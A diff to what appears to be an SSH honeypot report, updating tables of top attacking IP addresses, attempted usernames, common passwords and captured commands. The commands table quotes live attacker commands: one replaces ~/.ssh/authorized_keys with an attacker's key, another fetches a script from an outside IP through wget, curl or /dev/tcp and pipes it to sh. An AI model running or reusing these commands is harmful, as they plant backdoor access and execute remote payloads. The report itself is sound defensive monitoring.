@@ -13,50 +13,56 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 182.92.225.179 | 14299 |
-| 149.129.249.160 | 7215 |
-| 59.110.221.129 | 4722 |
-| 47.120.77.11 | 4342 |
-| 119.23.251.201 | 3705 |
-| 8.142.215.78 | 2476 |
-| 47.240.110.116 | 1741 |
-| 182.52.90.208 | 777 |
-| 8.216.85.26 | 517 |
-| 8.130.102.128 | 264 |
+| 47.238.4.62 | 5861 |
+| 8.134.192.181 | 4612 |
+| 8.137.12.155 | 4471 |
+| 123.56.193.120 | 4422 |
+| 47.243.61.112 | 4346 |
+| 119.23.251.201 | 1248 |
+| 192.250.224.76 | 582 |
+| 8.130.102.128 | 427 |
+| 81.0.248.203 | 380 |
+| 43.159.148.17 | 371 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 564 |
-| adm | 522 |
-| cacti | 518 |
-| 0 | 517 |
-| 1234 | 511 |
-| 123321 | 510 |
-| Admin | 509 |
-| anaconda | 509 |
-| bugtracer | 506 |
-| john | 505 |
+| root | 851 |
+| ubuntu | 380 |
+| test | 253 |
+| user | 163 |
+| admin | 94 |
+| sysadmin | 93 |
+| support | 80 |
+| postgres | 54 |
+| odoo | 53 |
+| steam | 48 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 84 |
-| password | 47 |
-| P@ssw0rd | 45 |
-| Aa123456 | 35 |
-| 12345678 | 34 |
-| admin | 33 |
-| 12345 | 32 |
-| test | 29 |
-| 111111 | 28 |
-| admin@123 | 27 |
+| password | 146 |
+| P@ssw0rd | 135 |
+| 123456 | 133 |
+| test | 84 |
+| 1qq2w3e4r5t | 79 |
+| admin | 63 |
+| root | 62 |
+| 12345678 | 48 |
+| 1 | 47 |
+| test123 | 44 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 47.251.21.164 | uname -s -m |
-| 113.45.235.206 | uname -s -m |
+| 211.253.10.96 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
+| 211.253.10.96 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
+| 211.253.10.96 | cat /proc/cpuinfo \| grep name \| wc -l |
+| 61.171.48.20 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
+| 61.171.48.20 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
+| 61.171.48.20 | cat /proc/cpuinfo \| grep name \| wc -l |
+| 5.182.211.148 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
+| 120.27.219.138 | uname -s -m |
